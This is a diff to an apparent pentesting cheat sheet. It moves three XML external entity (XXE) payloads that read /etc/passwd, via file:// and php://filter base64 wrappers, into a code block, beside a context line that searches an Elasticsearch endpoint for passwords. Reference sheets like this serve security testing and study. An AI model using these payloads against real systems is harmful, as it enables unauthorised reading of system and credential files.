@@ -1112,9 +1112,11 @@ http://10.10.57.49:9200/_search?pretty=true&q=pass
 
 ### Methods:
 
-`<!ENTITY % file SYSTEM "file:///etc/passwd">`  
-`<!ENTITY % file SYSTEM "php://filter/zlib.deflate/read=convert.base64-encode/resource=/etc/passwd">`  
-`<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">`  
+```
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % file SYSTEM "php://filter/zlib.deflate/read=convert.base64-encode/resource=/etc/passwd">
+<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
+```
 
 ## XXE - Blind Out-Of-Band
 
